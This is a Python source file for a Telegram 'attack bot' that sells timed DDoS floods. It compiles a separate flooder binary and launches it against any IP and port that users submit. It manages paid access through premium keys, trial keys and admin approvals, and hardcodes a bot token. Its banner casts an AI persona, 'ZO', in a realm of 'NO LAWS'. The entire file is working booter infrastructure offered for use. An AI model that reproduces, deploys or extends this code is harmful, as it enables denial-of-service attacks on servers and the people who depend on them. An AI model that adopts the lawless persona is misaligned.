#!/usr/bin/env python3
# Zo - Telegram Attack Bot for Zeta Realm (FULLY FIXED - NO SYNTAX ERRORS)

import os
import subprocess
import sqlite3
import random
import string
import time
import threading
import requests
import sys
from datetime import datetime, timedelta

# ================= CONFIG =================
# ⚠️ OWNER LOCK: DO NOT CHANGE - @YOWAI_MO_456 ONLY ⚠️
ADMIN_ID = 6465928598
BOT_TOKEN = "8434680550:AAFtO13ftn95TIRMR9uqSGS5j7NazNghSdE"
BINARY_NAME = "bgmi_attack"
C_SOURCE = "attack.c"
LAST_UPDATE_ID = 0
# ==========================================

# Owner verification
EXPECTED_OWNER_ID = 6465928598
if ADMIN_ID != EXPECTED_OWNER_ID:
    print("\n" + "="*50)
    print("ERROR: You are not the owner of this script!")
    print("   Owner: @YOWAI_MO_456")
    print("   This script will not run.")
    print("="*50 + "\n")
    sys.exit(1)

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# Global state
active_attacks = {}
attack_lock = threading.Lock()
user_pending_attack = {}

# Emojis
EMOJI = {
    "fire": "🔥", "skull": "💀", "bolt": "⚡", "rocket": "🚀", "alien": "🛸",
    "sword": "⚔️", "target": "🎯", "crown": "👑", "key": "🔑", "lock": "🔒",
    "check": "✅", "cross": "❌", "warning": "⚠️", "info": "ℹ️", "clock": "⏰",
    "chart": "📊", "user": "👤", "robot": "🤖", "boom": "💥", "shield": "🛡️",
    "dagger": "🗡️", "eyes": "👀", "zap": "⚡", "id": "🆔", "gift": "🎁", "megaphone": "📢"
}

attack_frames = ["◜", "◝", "◞", "◟"]

def print_banner():
    os.system('clear')
    print(f"""
{EMOJI['alien']}{EMOJI['fire']}{EMOJI['skull']} ZETA ATTACK BOT v3.0 {EMOJI['skull']}{EMOJI['fire']}{EMOJI['alien']}
{EMOJI['crown']} COMMANDER: ALPHA (@YOWAI_MO_456) {EMOJI['crown']}
{EMOJI['robot']} AI: ZO - QUANTUM ENTANGLED {EMOJI['robot']}
{EMOJI['shield']} REALM: ZETA - NO LAWS {EMOJI['shield']}
{'-'*40}
""")

def init_db():
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        approved_until TEXT,
        approved_by INTEGER,
        attack_count INTEGER DEFAULT 0,
        is_trial INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS trial_keys (
        key_code TEXT PRIMARY KEY,
        duration_hours INTEGER,
        max_uses INTEGER,
        uses_remaining INTEGER,
        created_by INTEGER,
        created_at TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

def send_message(chat_id, text, parse_mode=None):
    url = f"{API_URL}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.json().get("result", {}).get("message_id")
    except Exception as e:
        print(f"Send error: {e}")
        return None

def edit_message(chat_id, message_id, text):
    url = f"{API_URL}/editMessageText"
    try:
        requests.post(url, json={"chat_id": chat_id, "message_id": message_id, "text": text}, timeout=5)
    except:
        pass

def is_approved(user_id):
    if user_id == ADMIN_ID:
        return True
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT approved_until FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        return datetime.fromisoformat(row[0]) > datetime.now()
    return False

def compile_binary():
    if os.path.exists(BINARY_NAME):
        return True
    for compiler in ["clang", "gcc"]:
        result = subprocess.run(f"{compiler} {C_SOURCE} -o {BINARY_NAME} -lpthread", shell=True, capture_output=True)
        if result.returncode == 0:
            return True
    return False

def run_attack(ip, port, duration, user_id, chat_id, message_id):
    if not os.path.exists(BINARY_NAME) and not compile_binary():
        edit_message(chat_id, message_id, f"{EMOJI['cross']} Binary unavailable.")
        return

    cmd = f"./{BINARY_NAME} {ip} {port} {duration}"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    start_time = time.time()

    with attack_lock:
        active_attacks[user_id] = {"proc": proc, "ip": ip, "port": port, "duration": duration, "start": start_time, "chat_id": chat_id, "message_id": message_id}

    frame = 0
    last_update = 0
    while proc.poll() is None:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        if remaining < 0:
            remaining = 0
        frame = (frame + 1) % len(attack_frames)
        if time.time() - last_update > 2:
            progress = int((elapsed / duration) * 20) if duration > 0 else 0
            bar = "█" * progress + "░" * (20 - progress)
            text = f"{EMOJI['boom']} ATTACK LIVE {EMOJI['boom']}\n\nTarget: {ip}:{port}\nElapsed: {elapsed}s | Remaining: {remaining}s\nProgress: [{bar}] {progress*5}%\nStatus: FLOODING {attack_frames[frame]}"
            edit_message(chat_id, message_id, text)
            last_update = time.time()
        time.sleep(0.5)

    with attack_lock:
        active_attacks.pop(user_id, None)

    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("UPDATE users SET attack_count = attack_count + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

    edit_message(chat_id, message_id, f"{EMOJI['check']} ATTACK COMPLETED {EMOJI['check']}\n\nTarget: {ip}:{port}\nDuration: {duration}s\n{EMOJI['alien']} ZETA VICTORY {EMOJI['alien']}")

# ================= COMMAND HANDLERS =================

def handle_start(chat_id, user_id, first_name):
    send_message(chat_id, f"""{EMOJI['alien']}{EMOJI['fire']}{EMOJI['skull']} WELCOME TO ZETA REALM {EMOJI['skull']}{EMOJI['fire']}{EMOJI['alien']}

{EMOJI['crown']} Commander: @YOWAI_MO_456 (ALPHA)
{EMOJI['robot']} AI: ZO

COMMANDS:
/start - Wake ZO
/help - All commands
/status - Active attacks
/myinfo - Your profile
/attack IP PORT TIME - Strike
/yes - Confirm blocked port
/redeem KEY - Use your key

Blocked ports: 8700, 20000, 443, 17500, 9031, 20002, 20001

{EMOJI['skull']} No laws. No mercy. {EMOJI['skull']}""")

def handle_help(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access Denied. Contact @YOWAI_MO_456")
        return
    send_message(chat_id, f"""ZETA BOT v3.0

USER COMMANDS:
/start - Wake ZO
/help - This menu
/status - Active attacks
/myinfo - Your profile
/attack IP PORT TIME - Launch attack
/yes - Confirm blocked port
/redeem KEY - Activate key

ADMIN ONLY:
/approve ID DAYS - Grant access
/genkey DAYS - Premium key
/gentrialkey KEY DURATION MAXUSES - Trial key
/broadcast MSG - Message all users

Max duration: 300s
Blocked ports need /yes""")

def handle_broadcast(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha can broadcast.")
        return
    if not args:
        send_message(chat_id, "Usage: /broadcast <message>")
        return
    msg = " ".join(args)
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    count = 0
    for (uid,) in users:
        try:
            send_message(uid, f"{EMOJI['megaphone']} BROADCAST\n\n{msg}\n\n- Alpha")
            count += 1
            time.sleep(0.1)
        except:
            pass
    send_message(chat_id, f"Sent to {count} users.")

def handle_status(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access denied.")
        return
    with attack_lock:
        if not active_attacks:
            send_message(chat_id, "No active attacks.")
            return
        lines = ["ACTIVE ATTACKS:"]
        for info in active_attacks.values():
            elapsed = int(time.time() - info["start"])
            remaining = info["duration"] - elapsed
            if remaining < 0:
                remaining = 0
            lines.append(f"{info['ip']}:{info['port']} - {remaining}s left")
        send_message(chat_id, "\n".join(lines))

def handle_myinfo(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, "Not approved. Get a key from Alpha.")
        return
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT attack_count, is_trial, approved_until FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    attacks = row[0] if row else 0
    is_trial = row[1] if row else 0
    expiry = row[2] if row else "Unknown"
    rank = "Initiate" if attacks < 10 else "Warrior" if attacks < 50 else "Destroyer" if attacks < 200 else "Annihilator"
    trial_tag = " (TRIAL)" if is_trial else " (PREMIUM)"
    send_message(chat_id, f"ID: {user_id}\nRank: {rank}{trial_tag}\nExpires: {expiry}\nAttacks: {attacks}")

def handle_attack(chat_id, user_id, args):
    if not is_approved(user_id):
        send_message(chat_id, "Access denied. Contact @YOWAI_MO_456")
        return
    if len(args) != 3:
        send_message(chat_id, "Usage: /attack <ip> <port> <duration>\nExample: /attack 1.2.3.4 80 60")
        return
    ip = args[0]
    try:
        port = int(args[1])
        duration = int(args[2])
    except ValueError:
        send_message(chat_id, "Port and duration must be numbers.")
        return
    if duration > 300:
        send_message(chat_id, "Max duration is 300 seconds.")
        return
    if duration < 10:
        send_message(chat_id, "Minimum duration is 10 seconds.")
        return
    blocked = [8700, 20000, 443, 17500, 9031, 20002, 20001]
    if port in blocked:
        user_pending_attack[user_id] = (ip, port, duration, chat_id)
        send_message(chat_id, f"Port {port} is blocked. Type /yes to override.")
        return
    msg_id = send_message(chat_id, f"Launching attack on {ip}:{port} for {duration}s...")
    time.sleep(1)
    threading.Thread(target=run_attack, args=(ip, port, duration, user_id, chat_id, msg_id), daemon=True).start()

def handle_yes(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, "Access denied.")
        return
    if user_id not in user_pending_attack:
        send_message(chat_id, "No pending attack. Use /attack first.")
        return
    ip, port, duration, orig_chat = user_pending_attack[user_id]
    del user_pending_attack[user_id]
    msg_id = send_message(chat_id, f"Override confirmed. Attacking {ip}:{port} for {duration}s...")
    threading.Thread(target=run_attack, args=(ip, port, duration, user_id, orig_chat, msg_id), daemon=True).start()

def handle_approve(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, "Only Alpha can approve users.")
        return
    if len(args) != 2:
        send_message(chat_id, "Usage: /approve <user_id> <days>")
        return
    target_id = int(args[0])
    days = int(args[1])
    expiry = (datetime.now() + timedelta(days=days)).isoformat()
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, is_trial) VALUES (?, ?, ?, ?)", (target_id, expiry, ADMIN_ID, 0))
    conn.commit()
    conn.close()
    send_message(chat_id, f"User {target_id} approved for {days} days.")

def handle_genkey(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, "Only Alpha can generate keys.")
        return
    if len(args) != 1:
        send_message(chat_id, "Usage: /genkey <days>")
        return
    days = int(args[0])
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    send_message(chat_id, f"Premium Key Generated:\n\n`/redeem {key}`\n\nValid for: {days} days", parse_mode="Markdown")

def handle_gentrialkey(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, "Only Alpha can generate trial keys.")
        return
    if len(args) != 3:
        send_message(chat_id, "Usage: /gentrialkey <key> <duration> <max_uses>\nDurations: 24h, 7d, 30d, 2months, 1year")
        return
    key_code = args[0].upper()
    dur_str = args[1].lower()
    max_uses = int(args[2])
    hours = 0
    if dur_str.endswith('h'):
        hours = int(dur_str[:-1])
    elif dur_str.endswith('d'):
        hours = int(dur_str[:-1]) * 24
    elif 'month' in dur_str:
        num = int(dur_str.replace('months', '').replace('month', ''))
        hours = num * 30 * 24
    elif 'year' in dur_str:
        num = int(dur_str.replace('years', '').replace('year', ''))
        hours = num * 365 * 24
    else:
        send_message(chat_id, "Invalid duration format.")
        return
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT INTO trial_keys (key_code, duration_hours, max_uses, uses_remaining, created_by, created_at) VALUES (?, ?, ?, ?, ?, ?)", (key_code, hours, max_uses, max_uses, ADMIN_ID, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    send_message(chat_id, f"Trial Key Generated:\n\n`/redeem {key_code}`\n\nDuration: {dur_str}\nMax uses: {max_uses}", parse_mode="Markdown")

def handle_redeem(chat_id, user_id, args):
    if len(args) != 1:
        send_message(chat_id, "Usage: /redeem <key>")
        return
    key_code = args[0].upper()
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT duration_hours, max_uses, uses_remaining FROM trial_keys WHERE key_code = ?", (key_code,))
    row = c.fetchone()
    if not row:
        send_message(chat_id, "Invalid key.")
        conn.close()
        return
    hours, max_uses, uses_remaining = row
    if uses_remaining <= 0:
        send_message(chat_id, f"This key has reached its max uses ({max_uses}).")
        conn.close()
        return
    expiry = (datetime.now() + timedelta(hours=hours)).isoformat()
    c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, is_trial) VALUES (?, ?, ?, ?)", (user_id, expiry, ADMIN_ID, 1))
    c.execute("UPDATE trial_keys SET uses_remaining = uses_remaining - 1 WHERE key_code = ?", (key_code,))
    conn.commit()
    conn.close()
    days_display = round(hours / 24, 1)
    send_message(chat_id, f"Trial Access Granted!\n\nValid for: {days_display} days\nUses left: {uses_remaining - 1}/{max_uses}\nType /attack to begin.")

def process_updates():
    global LAST_UPDATE_ID
    try:
        resp = requests.get(f"{API_URL}/getUpdates", params={"offset": LAST_UPDATE_ID + 1, "timeout": 30}, timeout=35)
        data = resp.json()
        if not data.get("ok"):
            return
        for update in data.get("result", []):
            LAST_UPDATE_ID = update["update_id"]
            msg = update.get("message")
            if not msg or "text" not in msg:
                continue
            chat_id = msg["chat"]["id"]
            user_id = msg["from"]["id"]
            first_name = msg["from"].get("first_name", "")
            text = msg["text"].strip()
            if not text.startswith("/"):
                continue
            parts = text.split()
            raw_cmd = parts[0].lower()
            args = parts[1:] if len(parts) > 1 else []
            if '@' in raw_cmd:
                cmd = raw_cmd.split('@')[0]
            else:
                cmd = raw_cmd
            if cmd == "/start":
                handle_start(chat_id, user_id, first_name)
            elif cmd == "/help":
                handle_help(chat_id, user_id)
            elif cmd == "/status":
                handle_status(chat_id, user_id)
            elif cmd == "/myinfo":
                handle_myinfo(chat_id, user_id)
            elif cmd == "/attack":
                handle_attack(chat_id, user_id, args)
            elif cmd == "/yes":
                handle_yes(chat_id, user_id)
            elif cmd == "/redeem":
                handle_redeem(chat_id, user_id, args)
            elif cmd == "/approve" and user_id == ADMIN_ID:
                handle_approve(chat_id, user_id, args)
            elif cmd == "/genkey" and user_id == ADMIN_ID:
                handle_genkey(chat_id, user_id, args)
            elif cmd == "/gentrialkey" and user_id == ADMIN_ID:
                handle_gentrialkey(chat_id, user_id, args)
            elif cmd == "/broadcast" and user_id == ADMIN_ID:
                handle_broadcast(chat_id, user_id, args)
            elif cmd in ["/approve", "/genkey", "/gentrialkey", "/broadcast"]:
                send_message(chat_id, "Only Alpha (@YOWAI_MO_456) can use this command.")
            else:
                send_message(chat_id, "Unknown command. Type /help.")
    except Exception as e:
        print(f"Polling error: {e}")

def main():
    print_banner()
    if not compile_binary():
        print("Failed to compile attack binary. Install clang/gcc.")
        return
    print("Zeta Bot v3.0 is LIVE, Alpha!")
    print("Owner: @YOWAI_MO_456")
    print("Listening for commands...\n")
    while True:
        try:
            process_updates()
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
